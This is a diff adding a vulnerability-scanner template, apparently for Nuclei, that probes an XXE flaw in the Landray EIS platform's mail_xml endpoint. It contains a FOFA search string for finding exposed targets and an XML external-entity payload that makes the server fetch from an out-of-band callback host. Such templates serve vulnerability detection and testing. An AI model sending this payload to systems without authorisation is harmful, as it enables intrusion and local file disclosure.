@@ -1,0 +1,29 @@
+id: landray-eis-mail_xml-xxe
+info:
+  name: 蓝凌EIS智慧协同平台mail_xml接口XXE漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Scripts/jquery.landray.dialog.js"
+      蓝凌EIS智慧协同平台mail_xml接口存在XML外部实体注入漏洞，攻击者可通过构造恶意XML实体读取服务器本地文件或执行远程代码。该漏洞可通过特征路径/jquery.landray.dialog.js进行资产识别，漏洞披露时间为2025年12月1日。
+  tags: 蓝凌EIS智慧协同平台
+http:
+- raw:
+  - |
+    POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/Xml
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/test.xml"> %remote;]>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
